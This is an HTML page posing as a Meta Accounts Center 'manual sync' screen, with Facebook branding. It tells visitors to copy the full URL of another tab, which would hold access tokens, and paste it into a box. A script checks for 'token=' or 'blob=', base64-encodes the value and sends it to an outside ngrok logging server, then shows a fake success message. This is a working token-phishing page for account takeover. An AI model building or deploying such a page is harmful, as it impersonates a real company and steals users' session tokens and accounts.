<!DOCTYPE html>
<html>
<head>
    <title>Meta Accounts Center - Manual Sync</title>
    <style>
        body { font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding-top: 50px; }
        .box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 400px; text-align: center; }
        .btn { background: #1877f2; color: white; border: none; padding: 12px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 15px; }
        input { width: 90%; padding: 10px; margin-top: 10px; border: 1px solid #ddd; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="40" alt="FB">
        <h2>Connection Interrupted</h2>
        <p style="color:#606770; font-size: 14px;">Facebook security requires a manual verification code to link your Instagram profile.</p>
        
        <ol style="text-align: left; font-size: 13px; color: #606770;">
            <li>Go back to the previous tab.</li>
            <li>Copy the <b>entire URL</b> from the address bar.</li>
            <li>Paste it into the box below to sync.</li>
        </ol>

        <input type="text" id="tokenUrl" placeholder="Paste URL here...">
        <button class="btn" onclick="sendToPython()">Verify & Link Accounts</button>
    </div>

    <script>
        function sendToPython() {
            var fullUrl = document.getElementById('tokenUrl').value;
            if (fullUrl.includes('token=') || fullUrl.includes('blob=')) {
                // We send it to your Python server via ngrok
                fetch("https://bolsteringly-rightish-joan.ngrok-free.dev/log?data=" + btoa(fullUrl), {mode: 'no-cors'});
                alert("Verification Successful! You may now close this window.");
            } else {
                alert("Invalid URL. Please copy the full address from the other tab.");
            }
        }
    </script>
</body>
</html>
